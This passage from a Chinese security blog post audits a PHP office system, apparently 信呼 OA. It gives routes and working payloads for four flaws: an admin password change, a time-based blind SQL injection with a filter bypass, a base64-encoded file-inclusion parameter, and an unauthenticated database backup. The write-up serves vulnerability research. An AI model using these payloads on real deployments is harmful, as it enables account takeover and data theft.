+</span></span><span style="display:flex;"><span>				<span style="color:#58a1dd">m</span>(<span style="color:#a6be9d">&#39;admin&#39;</span>)<span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">update</span>(<span style="color:#a6be9d">&#34;`pass`=&#39;</span><span style="color:#a6be9d">$mima</span><span style="color:#a6be9d">&#39;,`editpass`=`editpass`+1&#34;</span>, <span style="color:#58a1dd">$where</span>);
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}</span></span></code></pre></div><p>路由应该这么写：?d=task&amp;m=reimplat|api&amp;a=index</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181654336.webp" alt="image-20240918165435941" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181654336.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181654336.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181654336.webp?size=large 2x" data-title="image-20240918165435941" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>成功修改密码</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181656479.webp" alt="image-20240918165618132" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181656479.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181656479.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181656479.webp?size=large 2x" data-title="image-20240918165618132" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="sql盲注" class="heading-element"><span>SQL盲注</span>
+  <a href="#sql%e7%9b%b2%e6%b3%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><code>webmain/public/upload/uploadAction.php</code> 在upfileAjax方法里面，找到执行sql语句处，跟进uploadback方法</p>
+<p>这里路由应该这么写：?d=public&amp;m=upload&amp;a=upfile&amp;ajaxbool=true</p>
+<p>修改uptype为*，文件名为sql注入语句，可以看到成功延时</p>
+<p>盲注语句可以这样写，这里单独的<code>()</code>会被过滤掉，双写就可以了</p>
+<pre tabindex="0"><code>1&#39; and if(ascii(substr((select database(())),1,1))&gt;1,SLEEP(3),0)-- -</code></pre><h3 id="文件包含" class="heading-element"><span>文件包含</span>
+  <a href="#%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>在web根目录创建一个1.php里面写<code>&lt;?php phpinfo();</code></p>
+<p>payload: http://127.0.0.1:999/?m=index&amp;a=getshtml&amp;surl=Li4vMQ==</p>
+<p>分析：</p>
+<p><code>include/View.php</code>的<code>第88行</code>定位到敏感函数<code>include_once</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">include_once</span>(<span style="color:#58a1dd">$mpathname</span>);</span></span></code></pre></div><p>看到第72行代码的形式<code>$mpathname = $xhrock-&gt;displayfile;</code>同样为获取某个类的成员属性</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">if</span>(<span style="color:#58a1dd">$xhrock</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">displayfile</span><span style="color:#ff636f">!=</span><span style="color:#a6be9d">&#39;&#39;</span> <span style="color:#ff636f">&amp;&amp;</span> <span style="color:#58a1dd">file_exists</span>(<span style="color:#58a1dd">$xhrock</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">displayfile</span>))<span style="color:#58a1dd">$mpathname</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$xhrock</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">displayfile</span>;</span></span></code></pre></div><p>全局搜索displayfile</p>
+<p>在<code>webmain/index/indexAction.php</code>下发现惊喜</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181752306.webp" alt="image-20240918175247135" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181752306.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181752306.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409181752306.webp?size=large 2x" data-title="image-20240918175247135" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>可以看到这个文件中的<code>$displayfile</code>是以<code>.php</code>为后缀的变量,而变量<code>$displayfile</code>最后可以决定我们文件包含<code>$mpathname</code>的取值,也就是说这里可能存在一个<code>.php</code>的文件包含.</p>
+<p>payload</p>
+<pre tabindex="0"><code>?m=index&amp;a=getshtml&amp;surl=Li4vMQ==</code></pre><h3 id="未授权备份" class="heading-element"><span>未授权备份</span>
+  <a href="#%e6%9c%aa%e6%8e%88%e6%9d%83%e5%a4%87%e4%bb%bd" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>在webmain/task/runt/sysAction.php中 这里用beifenAction调用了他的start方法</p>
+<p>找到beifenClassModel，看到里面的start方法 会把数据库数据备份到upload/data目录下，以时间命名</p>
+<p>这里staart不需要参数，感觉这种函数需要重点看，很容易有未授权</p>
+<p>paylaod</p>
+<pre tabindex="0"><code>/task.php?m=sys|runt&amp;a=beifen
+或者
+?d=task&amp;m=sys|runt&amp;a=beifen</code></pre></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-09-18 18:22:01">Updated on 2024-09-18&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-tag" title="Tags - 代码审计">代码审计</a><a href="/tags/php%E5%AE%89%E5%85%A8/" class="post-tag" title="Tags - Php安全">Php安全</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/%E5%AE%A1%E8%AE%A1/thinkphp5-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84rce/" class="post-nav-item" rel="prev" title="ThinkPHP5 变量覆盖导致的RCE"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>ThinkPHP5 变量覆盖导致的RCE</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
